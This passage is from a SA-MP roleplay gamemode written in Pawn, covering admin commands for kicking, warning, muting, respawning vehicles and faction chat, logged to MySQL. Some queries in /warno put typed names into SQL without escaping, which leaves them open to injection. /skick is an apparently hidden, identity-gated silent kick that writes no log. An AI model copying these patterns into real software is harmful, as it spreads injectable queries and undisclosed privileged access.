	else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	return 1;
}
CMD:kick(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	new id, reason[128], string[256], sendername[25], giveplayer[25];
	if(PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 3)
	{
	    if(sscanf(params, "us[128]", id, reason)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/kick <Name/Playerid> <reason>");
	    {
	        if(IsPlayerConnected(id))
	        {
				if(PlayerInfo[id][pAdmin] >= PlayerInfo[playerid][pAdmin] && PlayerInfo[playerid][pAdmin] > 0) return SendClientMessage(playerid, COLOR_GREY, "You can't kick a higher (or equal) level administrator.");
				GetPlayerName(id, giveplayer, sizeof(giveplayer));
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, sizeof(string), "{FF6347}Kick: %s has been kicked by %s, reason: %s.", giveplayer, sendername, reason);
				Adminlog(string);
				SendClientMessageToAll(COLOR_ERROR, string);
				new var100[300];
	    		mysql_format(SQL, var100, sizeof(var100), "INSERT INTO kicklogs (`playerid`,`giverid`,`playername`,`givername`,`reason`) VALUES ('%d','%d','%s','%s','%s')", PlayerInfo[id][pSQLID],PlayerInfo[playerid][pSQLID],giveplayer,sendername,reason);
				mysql_tquery(SQL,var100,"","");
				KickEx(id);
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}
	}
	else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	return 1;
}
CMD:skick(playerid, params[])
{
	if(!RwRobi(playerid)) return 0;
	new id;
	if(sscanf(params, "u", id)) return SCM(playerid, -1, "/skick [playerid]");
	if(!IsPlayerConnected(id)) return SCM(playerid, COLOR_ERROR, "The player is offline.");
	if(IsPlayerConnected(id)) { Kick(id); }
	return 1;
}
CMD:rveh(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	{
		new car,string[128],sendername[30];
	    if(sscanf(params, "d",car)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/rveh <Car ID>");
		new bool:unwanted[CAR_AMOUNT];
	    for(new player=0; player<MAX_PLAYERS; player++)
     	{
             if(IsPlayerInAnyVehicle(player))
			 {
			 	unwanted[GetPlayerVehicleID(player)]=true;
			 }
     	}
		if(!unwanted[car])
		{
			GetPlayerName(playerid, sendername, sizeof(sendername));
			SetVehicleToRespawn(car);
			format(string,sizeof(string),"[Admin-Warn]: {FFFFFF}Admin %s respawned vehicle %d.",sendername,car);
			ABroadCast(COLOR_AdminWarn,string,1);
		}
	}
	return 1;
}
CMD:rac(playerid, params[])
{
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] < 3)
            {
                SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
                return 1;
            }
			new string[256], sendername[30];
            SetTimer("RACtime", 10000, 0);
            GetPlayerName(playerid, sendername, sizeof(sendername));
			format(string,sizeof(string),"{FFFFFF}All unused cars will be respawned in {009999}10 {FFFFFF}seconds by %s!", sendername);
			SendClientMessageToAll(COLOR_SERVER,string);
        }
        return 1;
    }
CMD:respawn(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
  		if (PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 1)
		{
			new id,sendername[30],giveplayer[30],string[256];
			if(sscanf(params, "u", id)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/respawn <Name/Playerid>");
			{
				if(IsPlayerConnected(id))
    			{
				    if(IsPlayerConnected(id))
    				{
						GetPlayerName(id, giveplayer, sizeof(giveplayer));
						SpawnPlayer(id);
						GetPlayerName(playerid, sendername, sizeof(sendername));
 						format(string, sizeof(string), "You have been respawned by %s.", sendername);
						SendClientMessage(id, COLOR_ERROR, string);
						format(string, sizeof(string), "You respawned %s.", giveplayer);
						SendClientMessage(playerid, COLOR_ERROR, string);
						format(string, sizeof(string), "[Admin-Warn]: {FFFFFF}%s has /respawn-ed %s.",sendername, giveplayer);
						ABroadCast(COLOR_AdminWarn,string,1);
						HLChat(COLOR_AdminWarn,string);
						return 1;
					}
				}
                else
                {
                    SCM(playerid,COLOR_SERVER,"{C1F589}Error: Player not connected.");
                }
			}
   		}
		else
		{
			SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
	}
	return 1;
}
CMD:l(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if (PlayerInfo[playerid][pLeader] >= 1 || PlayerInfo[playerid][pAdmin] >= 1)
		{
			new sendername[30],mesajelc[250],string[250];
	       	GetPlayerName(playerid, sendername, sizeof(sendername));
	    	if(sscanf(params, "s[250]",mesajelc)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/l <Message>");
	    	{
	    		if(FindIP(mesajelc)) /// Anti-Reclama
		        {
			        new advertiser[MAX_PLAYER_NAME];
			        GetPlayerName(playerid, advertiser, sizeof(advertiser));
			        format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in /l.", advertiser, playerid, mesajelc);
					ABroadCast(COLOR_SERVER,string,1);
		        }
		        for(new i; i < sizeof(TLD); i++)
				{
					if(strfind(mesajelc, TLD[i], true) != -1)
					{
						if(strfind(mesajelc, "wwww.Magic-Gaming.tk", true) != -1 || strfind(mesajelc, "wwww.Magic-Gaming.tk/forum", true) != -1 || strfind(mesajelc, "Magic-Gaming.tk", true) != -1) break;
						new advertiser[MAX_PLAYER_NAME];
						GetPlayerName(playerid, advertiser, sizeof(advertiser));
						format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in /l.", advertiser, playerid, mesajelc);
						ABroadCast(COLOR_SERVER,string,1);
					}
				}
				if(PlayerInfo[playerid][pAdmin] >= 1)
				{
					format(string, sizeof(string), "(/l) Admin %s: %s",sendername, mesajelc);
				}
				else
				{
					if (PlayerInfo[playerid][pLeader] == 1)
					{
						format(string, sizeof(string), "(/l) Los Santos Police Department Leader %s: %s",sendername, mesajelc);
					}
					else if (PlayerInfo[playerid][pLeader] == 2)
					{
						format(string, sizeof(string), "(/l) Federal Bureau of Investigation Leader %s: %s",sendername, mesajelc);
					}
					else if (PlayerInfo[playerid][pLeader] == 3)
					{
						format(string, sizeof(string), "(/l) National Guard Leader %s: %s",sendername, mesajelc);
					}
					else if (PlayerInfo[playerid][pLeader] == 4)
					{
						format(string, sizeof(string), "(/l) Los Aztecas Leader %s: %s",sendername, mesajelc);
					}
					else if (PlayerInfo[playerid][pLeader] == 5)
					{
						format(string, sizeof(string), "(/l) Grove Street Leader %s: %s",sendername, mesajelc);
					}
					else if (PlayerInfo[playerid][pLeader] == 6)
					{
						format(string, sizeof(string), "(/l) Los Vagos Leader %s: %s",sendername, mesajelc);
					}
					else if (PlayerInfo[playerid][pLeader] == 8)
					{
						format(string, sizeof(string), "(/l) Las Venturas Police Department Leader %s: %s",sendername, mesajelc);
					}
					else if (PlayerInfo[playerid][pLeader] == 9)
					{
						format(string, sizeof(string), "(/l) News Reporters Leader %s: %s",sendername, mesajelc);
					}
					else if (PlayerInfo[playerid][pLeader] == 10)
					{
						format(string, sizeof(string), "(/l) Ballas Leader %s: %s",sendername, mesajelc);
					}
					else if (PlayerInfo[playerid][pLeader] == 11)
					{
						format(string, sizeof(string), "(/l) Hitman Agency Leader %s: %s",sendername, mesajelc);
					}
					else if (PlayerInfo[playerid][pLeader] == 12)
					{
						format(string, sizeof(string), "(/l) School Instructors Leader %s: %s",sendername, mesajelc);
					}
					else if (PlayerInfo[playerid][pLeader] == 13)
					{
						format(string, sizeof(string), "(/l) Taxi Leader %s: %s",sendername, mesajelc);
					}
					else if (PlayerInfo[playerid][pLeader] == 14)
					{
						format(string, sizeof(string), "(/l) Paramedic Department Leader %s: %s",sendername, mesajelc);
					}
					else if (PlayerInfo[playerid][pLeader] == 15)
					{
						format(string, sizeof(string), "(/l) San Fierro Police Departament Leader %s: %s",sendername, mesajelc);
					}
				}
		    	if (PlayerInfo[playerid][pLeader] >= 1 || PlayerInfo[playerid][pAdmin] >= 1)
		    	{
		     		LeaderChat(COLOR_TEAL, string);
		    	}
            }
        }
		else
		{
			SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Only leaders/admins can use this command.");
			return 1;
		}
	}
	return 1;
}
CMD:fvrs(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid) && PlayerInfo[playerid][pAdmin] >= 2)
	{
		new bool:unwanted[CAR_AMOUNT];
		for(new player=0; player<MAX_PLAYERS; player++)
		{
    		if(IsPlayerInAnyVehicle(player)) { unwanted[GetPlayerVehicleID(player)]=true; }
		}
		for(new v = helpercars[1]; v <= helpercars[5]; v++)
		{
			if(!unwanted[v]) SetVehicleToRespawn(v);
			Gas[v] = 100;
		}
		for(new v = admincars[1]; v <= admincars[5]; v++)
		{
			if(!unwanted[v]) SetVehicleToRespawn(v);
			Gas[v] = 100;
		}
		SCM(playerid,COLOR_SERVER,"{C1F589}All Admins / Helpers cars respawn.");
		return 1;
	}
	else return SCM(playerid, COLOR_RED,"You are not authorized to use this command.");
}

CMD:fvrespawn(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
   	{
      	if(PlayerInfo[playerid][pLeader] >= 1 ||PlayerInfo[playerid][pRank] >=5 && PlayerInfo[playerid][pMember] != 0)
      	{
      		if(PlayerInfo[playerid][pMember] == 1 && PlayerInfo[playerid][pRank] >=5)//PD
      		{
				new bool:unwanted[CAR_AMOUNT];
				for(new player=0; player<MAX_PLAYERS; player++)
      			{
            		if(IsPlayerInAnyVehicle(player)) { unwanted[GetPlayerVehicleID(player)]=true; }
      			}
				for(new v = Copcar[1]; v <= Copcar[32]; v++)
				{
					if(!unwanted[v]) SetVehicleToRespawn(v);
					Gas[v] = 100;
				}
      		}
      		if(PlayerInfo[playerid][pMember] == 2 && PlayerInfo[playerid][pRank] >=5)//FBI
      		{
				new bool:unwanted[CAR_AMOUNT];
				for(new player=0; player<MAX_PLAYERS; player++)
      			{
	            	if(IsPlayerInAnyVehicle(player)) { unwanted[GetPlayerVehicleID(player)]=true; }
	      		}
				for(new v = Fbicar[1]; v <= Fbicar[18]; v++)
				{
					if(!unwanted[v]) SetVehicleToRespawn(v);
					Gas[v] = 100;
				}
      		}
      		if(PlayerInfo[playerid][pMember] == 3 && PlayerInfo[playerid][pRank] >=5)// NG
      		{
				new bool:unwanted[CAR_AMOUNT];
				for(new player=0; player<MAX_PLAYERS; player++)
      			{
            		if(IsPlayerInAnyVehicle(player)) { unwanted[GetPlayerVehicleID(player)]=true; }
      			}
				for(new v = Ngcar[1]; v <= Ngcar[11]; v++)
				{
					if(!unwanted[v]) SetVehicleToRespawn(v);
					Gas[v] = 100;
				}
      		}
      		if(PlayerInfo[playerid][pMember] == 4 && PlayerInfo[playerid][pRank] >=5)//Los Aztecas
      		{
				new bool:unwanted[CAR_AMOUNT];
				for(new player=0; player<MAX_PLAYERS; player++)
      			{
           		 	if(IsPlayerInAnyVehicle(player)) { unwanted[GetPlayerVehicleID(player)]=true; }
      			}
				for(new v = Aztecasc[1]; v <= Aztecasc[14]; v++)
				{
					if(!unwanted[v]) SetVehicleToRespawn(v);
					Gas[v] = 100;
				}
      		}
      		if(PlayerInfo[playerid][pMember] == 5 && PlayerInfo[playerid][pRank] >=5)//GP
      		{
				new bool:unwanted[CAR_AMOUNT];
				for(new player=0; player<MAX_PLAYERS; player++)
      			{
            		if(IsPlayerInAnyVehicle(player)) { unwanted[GetPlayerVehicleID(player)]=true; }
      			}
				for(new v = Grovec[1]; v <= Grovec[12]; v++)
				{
					if(!unwanted[v]) SetVehicleToRespawn(v);
					Gas[v] = 100;
				}
      		}
      		if(PlayerInfo[playerid][pMember] == 6 && PlayerInfo[playerid][pRank] >=5)//LSC
      		{
				new bool:unwanted[CAR_AMOUNT];
				for(new player=0; player<MAX_PLAYERS; player++)
      			{
          	 	 	if(IsPlayerInAnyVehicle(player)) { unwanted[GetPlayerVehicleID(player)]=true; }
      			}
				for(new v = Vagosc[1]; v <= Vagosc[11]; v++)
				{
					if(!unwanted[v]) SetVehicleToRespawn(v);
					Gas[v] = 100;
				}
      		}
      		if(PlayerInfo[playerid][pMember] == 8 && PlayerInfo[playerid][pRank] >=5)//LVPD
      		{
				new bool:unwanted[CAR_AMOUNT];
				for(new player=0; player<MAX_PLAYERS; player++)
      			{
            		if(IsPlayerInAnyVehicle(player)) { unwanted[GetPlayerVehicleID(player)]=true; }
      			}
				for(new v = LVpdcar[1]; v <= LVpdcar[40]; v++)
				{
					if(!unwanted[v]) SetVehicleToRespawn(v);
					Gas[v] = 100;
				}
      		}
      		if(PlayerInfo[playerid][pMember] == 15 && PlayerInfo[playerid][pRank] >=5)//SFPD
      		{
				new bool:unwanted[CAR_AMOUNT];
				for(new player=0; player<MAX_PLAYERS; player++)
      			{
            		if(IsPlayerInAnyVehicle(player)) { unwanted[GetPlayerVehicleID(player)]=true; }
      			}
				for(new v = SFpdcar[1]; v <= SFpdcar[27]; v++)
				{
					if(!unwanted[v]) SetVehicleToRespawn(v);
					Gas[v] = 100;
				}
      		}
      		if(PlayerInfo[playerid][pMember] == 9 && PlayerInfo[playerid][pRank] >=5)// NR
      		{
				new bool:unwanted[CAR_AMOUNT];
				for(new player=0; player<MAX_PLAYERS; player++)
      			{
            		if(IsPlayerInAnyVehicle(player)) { unwanted[GetPlayerVehicleID(player)]=true; }
      			}
				for(new v = news[1]; v <= news[17]; v++)
				{
					if(!unwanted[v]) SetVehicleToRespawn(v);
					Gas[v] = 100;
				}
      		}
      		if(PlayerInfo[playerid][pMember] == 10 && PlayerInfo[playerid][pRank] >=5)// Ballas
     	 	{
				new bool:unwanted[CAR_AMOUNT];
				for(new player=0; player<MAX_PLAYERS; player++)
      			{
         	 	  	if(IsPlayerInAnyVehicle(player)) { unwanted[GetPlayerVehicleID(player)]=true; }
      			}
				for(new v = Ballasc[1]; v <= Ballasc[14]; v++)
				{
					if(!unwanted[v]) SetVehicleToRespawn(v);
					Gas[v] = 100;
				}
      		}
      		if(PlayerInfo[playerid][pMember] == 11 && PlayerInfo[playerid][pRank] >=5)// HITMAN
      		{
				new bool:unwanted[CAR_AMOUNT];
				for(new player=0; player<MAX_PLAYERS; player++)
      			{
            		if(IsPlayerInAnyVehicle(player)) { unwanted[GetPlayerVehicleID(player)]=true; }
      			}
				for(new v = thea[1]; v <= thea[16]; v++)
				{
					if(!unwanted[v]) SetVehicleToRespawn(v);
					Gas[v] = 100;
				}
      		}
      		if(PlayerInfo[playerid][pMember] == 12 && PlayerInfo[playerid][pRank] >=5)// SI
      		{
				new bool:unwanted[CAR_AMOUNT];
				for(new player=0; player<MAX_PLAYERS; player++)
      			{
            		if(IsPlayerInAnyVehicle(player)) { unwanted[GetPlayerVehicleID(player)]=true; }
      			}
				for(new v = si[1]; v <= si[13]; v++)
				{
					if(!unwanted[v]) SetVehicleToRespawn(v);
					Gas[v] = 100;
				}
      		}
      		if(PlayerInfo[playerid][pMember] == 13 && PlayerInfo[playerid][pRank] >=5)//taxi
      		{
				new bool:unwanted[CAR_AMOUNT];
				for(new player=0; player<MAX_PLAYERS; player++)
      			{
            		if(IsPlayerInAnyVehicle(player)) { unwanted[GetPlayerVehicleID(player)]=true; }
      			}
				for(new v = taxic[1]; v <= taxic[10]; v++)
				{
					if(!unwanted[v]) SetVehicleToRespawn(v);
					Gas[v] = 100;
				}
      		}
      		if(PlayerInfo[playerid][pMember] == 14 && PlayerInfo[playerid][pRank] >=5)//fp
      		{
				new bool:unwanted[CAR_AMOUNT];
				for(new player=0; player<MAX_PLAYERS; player++)
      			{
            		if(IsPlayerInAnyVehicle(player)) { unwanted[GetPlayerVehicleID(player)]=true; }
      			}
				for(new v = ambcars[1]; v <= ambcars[10]; v++)
				{
					if(!unwanted[v]) SetVehicleToRespawn(v);
					Gas[v] = 100;
				}
      		}
      		new sender1[75],s1[250];
      		GetPlayerName(playerid, sender1,sizeof(sender1));
      		format(s1,250,"%s has respawned all faction's cars.", sender1);
			SendFamilyMessage(PlayerInfo[playerid][pMember],COLOR_LEADER,s1);
      	}
	  	else
      	{
        	SendClientMessage(playerid,COLOR_SERVER,"{FFB870}You are not a leader/subleader or rank 5 of a team.");
        	return 1;
      	}
	}
    return 1;
}
CMD:fvr(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	return cmd_fvrespawn(playerid, params);
}
CMD:quitgroup(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
	    new query[256];
	    if(PlayerInfo[playerid][pLeader] > 0)
		{
			ShowPlayerDialog(playerid,DIALOG_QUITGROUP,DIALOG_STYLE_MSGBOX,"Are you sure?","Current faction want to leave?\nBecause you'll get 50 FP leader.","Yes","No");
		}
	    if(PlayerInfo[playerid][pMember] < 1) return SendClientMessage(playerid, COLOR_SERVER, "You are not a member of a group.");
        else if(PlayerInfo[playerid][pMember] >= 1 && PlayerInfo[playerid][pLeader] == 0)
		{
		    format(query, 256, "SELECT * FROM `users` WHERE `Member` = '%d' AND `Rank` = '7'", PlayerInfo[playerid][pMember]);
		    new Cache: masta = mysql_query(SQL, query);
			if(cache_get_row_count() >= 1)
			{
				ShowPlayerDialog(playerid,DIALOG_QUITGROUP,DIALOG_STYLE_MSGBOX,"Are you sure?","Current faction want to leave?\nYou will receive 20 PF faction has as leader.","Yes","No");
			}
			else
			{
				ShowPlayerDialog(playerid,DIALOG_QUITGROUP,DIALOG_STYLE_MSGBOX,"Are you sure?","Current faction want to leave?\nYou will not receive FP as faction leader has.","Yes","No");
			}
			cache_delete(masta);
   		}
	}
	return 1;
}
CMD:checkdays(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
        if(PlayerInfo[playerid][pMember] >= 1)
		{
			new string[256];
			format(string, sizeof(string), "You have %d days in this faction.",PlayerInfo[playerid][pFactionTime]);
			SendClientMessage(playerid, COLOR_SERVER, string);
		}
	}
	return 1;
}
CMD:warn(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
		if (PlayerInfo[playerid][pAdmin] >= 1)
		{
			new id,reason[128],string[200],giveplayer[30],sendername[30],time,playerip[16];
			if(sscanf(params, "us[128]", id, reason)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/warn <Name/Playerid> <reason>");
			{
			    if(IsPlayerConnected(id))
			    {
			        new ip[25];
				    GetPlayerIp(id, ip, sizeof(ip));
				    if(PlayerInfo[id][pAdmin] >= PlayerInfo[playerid][pAdmin]) return SendClientMessage(playerid, COLOR_GREY, "You can't warn a higher (or equal) level administrator.");
			        if(id != INVALID_PLAYER_ID)
			        {
					    GetPlayerName(id, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						PlayerInfo[id][pWarns] += 1;
						format(string, sizeof(string), "You warned %s, reason: %s", giveplayer, reason);
						SendClientMessage(playerid, COLOR_ERROR, string);
						format(string, sizeof(string), "You were warned by %s, reason: %s", sendername, reason);
						SendClientMessage(id, COLOR_ERROR, string);
						format(string, sizeof(string), "{FF6347}Warn: %s received a warn from admin %s, reason: %s", giveplayer, sendername, reason);
						SendClientMessageToAll(COLOR_ERROR, string);
	                    new var100[256];
	    				mysql_format(SQL, var100, sizeof(var100), "INSERT INTO punishlogs (`playerid`,`giverid`,`actionid`,`reason`,`playername`,`givername`) VALUES ('%d','%d','5','%s','%s','%s')", PlayerInfo[id][pSQLID],PlayerInfo[playerid][pSQLID],reason,giveplayer,sendername);
						mysql_tquery(SQL,var100,"","");
						Adminlog(string);
						Update(id,pWarnsx);
						if(PlayerInfo[id][pWarns] >= 3)
						{
						    new str[500];
						    GetPlayerIp(id, playerip, sizeof(playerip));
						    time = gettime() + (3*86400);
						    mysql_format(SQL,str,sizeof(str),"INSERT INTO bans (PlayerName, AdminName, Reason, IP, Days, IPBan, Permanent, Active, Time) VALUES('%s', 'AdmBot', '3/3 warns', '%s', 3, 0, 0, 1, %d)",
							PlayerInfo[id][pNormalName],playerip,time);
							mysql_tquery(SQL,str,"","");
							PlayerInfo[id][pWarns] = 0;
							Update(id,pWarnsx);
							format(string, sizeof(string), "{FF6347}Ban: %s has been banned by AdmBot for 3 days, reason: 3/3 warns.", giveplayer);
							SendClientMessageToAll(COLOR_ERROR, string);
	    					mysql_format(SQL, var100, sizeof(var100), "INSERT INTO punishlogs (`playerid`,`giverid`,`actionid`,`reason`,`playername`,`givername`) VALUES ('%d','0','2','3/3 warns','%s','AdmBot')", PlayerInfo[id][pSQLID], PlayerInfo[id][pNormalName]);
							mysql_tquery(SQL,var100,"","");
							KickEx(id);
						}
					}
				}
			    else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
			}
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:warno(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
		if (PlayerInfo[playerid][pAdmin] >= 1)
		{
			new id[25],reason[128],string[200],sendername[30],cont,time,playeridd;
			if(sscanf(params, "s[25]s[128]", id, reason)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/warn <Name> <reason>");
	        cont = MySQLCheckAccount(id);
	        if(cont == 0) return SCM(playerid,COLOR_SERVER,"{FFB870}This name does not exist.");
			new intid,strid[32],str1[500],result[500];
			format(str1, sizeof(str1), "SELECT `Warnings` FROM users WHERE `name` = '%s'",id);
			mysql_query(SQL,str1);
			mysql_store_result();
			mysql_fetch_row(strid);
			intid = strval(strid);
		    mysql_free_result();
		    format(str1, sizeof(str1), "SELECT `id` FROM users WHERE `name` = '%s'", id);
			mysql_store_result();
			mysql_query(SQL,str1);
			if(mysql_retrieve_row())
			{
				mysql_fetch_field_row(result, "id"); playeridd = strval( result );
			}
			mysql_free_result();
		    intid++;
			GetPlayerName(playerid, sendername, sizeof(sendername));
			format(string, sizeof(string), "{FF6347}Offline: Warn: %s received a warn from admin %s, reason: %s.",id, sendername, reason);
			SendClientMessageToAll(COLOR_ERROR, string);
			new var100[256];
			mysql_format(SQL, var100, sizeof(var100), "INSERT INTO punishlogs (`playerid`,`giverid`,`actionid`,`reason`,`playername`,`givername`) VALUES ('%d','%d','5','%s','%s','%s')", playeridd,PlayerInfo[playerid][pSQLID],reason,id,sendername);
			mysql_tquery(SQL,var100,"","");
			format(string, sizeof(string), "Ai primit un warn de la adminul %s, motiv: %s.",sendername, reason);
			mysql_format(SQL, var100, sizeof(var100), "INSERT INTO `emails` (`playerid`,`Message`) VALUES('%d','%s')",playeridd,string);
			mysql_tquery(SQL,var100,"","");
			if(intid >= 3)
			{
			    new str[500];
			    time = gettime() + (3*86400);
                mysql_format(SQL,str,sizeof(str),"INSERT INTO bans (PlayerName, AdminName, Reason, IP, Days, IPBan, Permanent, Active, Time) VALUES('%s', 'AdmBot', '3/3 warns', '0', 3, 0, 0, 1, %d)",
				id,time);
				mysql_tquery(SQL,str,"","");
				format(string, sizeof(string), "{FF6347}Offline: {FF6347}Ban: %s has been banned by AdmBot for 3 days, reason: 3/3 warns.", id);
				SendClientMessageToAll(COLOR_ERROR, string);
				mysql_format(SQL, var100, sizeof(var100), "INSERT INTO punishlogs (`playerid`,`giverid`,`actionid`,`reason`,`playername`,`givername`) VALUES ('%d','0','2','%s','%s','%s')", playeridd,reason,id,sendername);
				mysql_tquery(SQL,var100,"","");
				intid = 0;
			}
			mysql_format(SQL,str1,sizeof(str1),"UPDATE users SET `Warnings`='%d' WHERE `name`='%s'",intid,id);
			mysql_tquery(SQL,str1,"","");
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:unwarn(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if (PlayerInfo[playerid][pAdmin] >= 5)
		{
			new id,string[200],giveplayer[30],sendername[30];
			if(sscanf(params, "u", id)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/unwarn <Name/Playerid>");
			{
			    if(IsPlayerConnected(id))
			    {
			        if(id != INVALID_PLAYER_ID)
			        {
						if(PlayerInfo[id][pWarns] > 0)
						{
					    	GetPlayerName(id, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							PlayerInfo[id][pWarns] -= 1;
							format(string, sizeof(string), "You unwarned %s.", giveplayer);
				            SendClientMessage(playerid, COLOR_ERROR, string);
					        format(string, sizeof(string), "You were unwarned by %s.", sendername);
					        SendClientMessage(id, COLOR_ERROR, string);
				            format(string, sizeof(string), "[Admin-Warn]: {FFFFFF}%s was unwarn by %s.", giveplayer, sendername);
				            Adminlog(string);
                            Update(id,pWarnsx);
							return 1;
						}
						else return SCM(playerid, COLOR_SERVER, "{C1F589}Error: Player does not have warn.");
					}
				}
	     		else
    			{
                    SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		    	}
			}
		}
		else
		{
  			SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
	}
	return 1;
}
CMD:setfpo(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
        if (PlayerInfo[playerid][pAdmin] < 5) return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
        new id[25],cont,fp;
        if(sscanf(params, "s[25]i",id,fp)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/setfp <Name> <FP>");
        cont = MySQLCheckAccount(id);
        if(cont == 0) return SCM(playerid,COLOR_SERVER,"{FFB870}This name does not exist.");
		new str1[128];
		mysql_format(SQL,str1,sizeof(str1),"UPDATE users SET `FPunish`='%d' WHERE `name`='%s'",fp,id);
		mysql_tquery(SQL,str1,"","");
	}
	return 1;
}
CMD:setfp(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if (PlayerInfo[playerid][pAdmin] < 5) return SCM(playerid,COLOR_ERROR, AdminOnly);
	new id,fp;
	if(sscanf(params, "ud",id,fp)) return SCM(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/setfp <Name/Playerid> <FP>");
	PlayerInfo[id][pFpunish] = fp;
    Update(id,pFpunishx);
    return 1;
}
CMD:removekey(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
        if (PlayerInfo[playerid][pAdmin] < 6) return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
        new id,x_nr[15];
        if(sscanf(params, "us[15]", id,x_nr)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/removekey <Name/Playerid> <House/Bussines>");
    	if(id == INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
        if(strcmp(x_nr,"house",true) == 0)
     	{
			new str1[158];
			mysql_format(SQL,str1,sizeof(str1),"UPDATE users SET `House`='999' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
			mysql_tquery(SQL,str1,"","");
   			SCM(playerid,COLOR_ERROR,"Please enter in a minute to database updates.");
   			KickEx(id);
			return 1;
     	}
        if(strcmp(x_nr,"bussines",true) == 0)
     	{
			new str1[158];
			mysql_format(SQL,str1,sizeof(str1),"UPDATE users SET `Bizz`='255' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
			mysql_tquery(SQL,str1,"","");
   			SCM(playerid,COLOR_ERROR,"Please enter in a minute to database updates.");
   			KickEx(id);
			return 1;
		}
	}
	return 1;
}
CMD:muteo(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
        if (PlayerInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
        new id[25],cont,msg[80],time,playeridd,result[500];
        if(sscanf(params, "s[25]is[80]", id,time,msg)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/muteo <Name> <Time(minutes)> <Reason>");
		cont = MySQLCheckAccount(id);
        if(cont == 0) return SCM(playerid,COLOR_SERVER,"{FFB870}This name does not exist.");
        if(time <= 0) return SCM(playerid,COLOR_SERVER,"{FFB870}Invalid mute time.");
        new sendername[25],string[184];
        GetPlayerName(playerid,sendername,sizeof(sendername));
